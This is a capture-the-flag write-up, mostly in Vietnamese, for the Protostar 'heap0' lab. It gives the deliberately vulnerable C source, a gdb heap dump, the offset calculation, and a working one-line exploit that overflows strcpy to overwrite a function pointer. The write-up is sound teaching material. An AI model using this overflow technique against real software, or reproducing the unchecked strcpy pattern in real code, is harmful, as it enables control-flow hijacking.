# HEAP ZERO

## About

This level introduces heap overflows and how they can influence code flow.

This level is at /opt/protostar/bin/heap0

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

## Solutions

`HEAP ZERO` cho chúng ta thấy cách mà việc heap overflows gây ảnh hưởng tới các biến được cấp phát động và từ đó dẫn tới thay đổi luồng thực thi code.

Bộ cấp phát bộ nhớ được sử dụng trong Protostar là `glibc's malloc`, dựa trên `Doug Lea's malloc` (hay gọi tắt là `dlmalloc`).

Nhìn vào đoạn mã của chương trình sau

```
...
struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

int main(){
...
struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;
...
}
```

Ta thấy được khai báo hai con trỏ theo kiểu dữ liệu được định nghĩa với 1 kiểu dữ liệu `data` gồm mảng ký tự `name[64]` và một kiểu `fp` gồm con trỏ hàm. Hai kiểu dữ liệu được cấp phát động, `f->fp = nowinner` được phân bổ như sau trong heap memory.

```
Khi chạy chương trình: $./heap0 aaaa
data is at 0x804a008, fp is at 0x804a050
level has not been passed

...
(gdb) x/100wx 0x804a000         <-- địa chỉ bắt đầu của heap
0x804a000:      0x00000000      0x00000049      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048478      0x00000000      0x00000000      0x00020fa9
...

(gdb) p nowinner
$1 = {void (void)} 0x8048478 <nowinner>
```

Tiếp theo đó là strcpy(d->name, argv[1]); sẽ gây ra buffer overflow trên `d->name` và đủ lớn sẽ ghi đè con trỏ hàm `f->fp`. Độ dài đó là `0x804a050 - 0x804a008 = 0x48` và sau đó là địa chỉ hàm `winner()`.

```
(gdb) p winner
$1 = {void (void)} 0x8048464 <winner>
```

Tiến hành khai thác:

```
root@protostar:/opt/protostar/bin# ./heap0 $(python -c 'print "A" * 0x48 + "\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed
```

## Documents

<https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf>

<https://sourceware.org/glibc/wiki/MallocInternals>



